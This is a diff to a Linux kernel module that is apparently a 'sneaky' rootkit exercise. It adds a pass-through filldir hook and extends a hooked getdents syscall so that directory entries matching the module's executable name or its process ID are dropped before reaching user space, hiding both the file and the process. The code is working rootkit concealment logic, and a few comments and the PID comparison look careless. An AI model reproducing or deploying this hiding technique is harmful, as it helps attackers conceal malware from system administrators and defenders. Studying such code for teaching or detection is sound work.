@@ -11,6 +11,7 @@
 #include <linux/syscalls.h>
 #include <linux/slab.h>
 #include <net/sock.h>
+
 /*
 #include <sys/syscall.h>
 #include <sys/stat.h>
@@ -72,6 +73,16 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 }
 
 //FILLDIR FUNCTIONS
+//This is used for all system calls.
+asmlinkage int (*original_filldir)(void * buf, const char *name, int nlen,
+				   loff_t off, ino_t ino, unsigned x);
+
+//Define our new sneaky version of the 'open' syscall
+asmlinkage int sneaky_filldir(void * buf, const char *name, int nlen,
+			      loff_t off, ino_t ino, unsigned x)
+{
+  return original_filldir(buf, name, nlen, off, ino, x);
+}
 
 
 
@@ -85,7 +96,11 @@ asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
   //initial Direct structure
   struct linux_dirent *dir;
   //initialize digits
-  size_t SNEAKYSIZE = sizeof(SNEAKY)-1;
+  size_t SNEAKYSIZE = sizeof(SNEAKY)- 1;
+
+  //Process ID as string
+  char num[20];
+  sprintf(num, "%d", pid);
   
   //cast dirent structure to char * to manipulate byte by byte
   char * mychar = (char *) dirp;
@@ -114,7 +129,7 @@ asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
     dir = (struct linux_dirent *) (mem + i);
     
     //Dirent name matches our executable name --> DO NOT COPY TO USER SPACE
-    if(strncmp(dir->d_name, SNEAKY, SNEAKYSIZE) == 0) {
+    if((strncmp(dir->d_name, SNEAKY, SNEAKYSIZE) == 0)||(strncmp(dir->d_name, num, sizeof(num)-1)==0)) {
       found_block += dir->d_reclen;
       continue;
     }
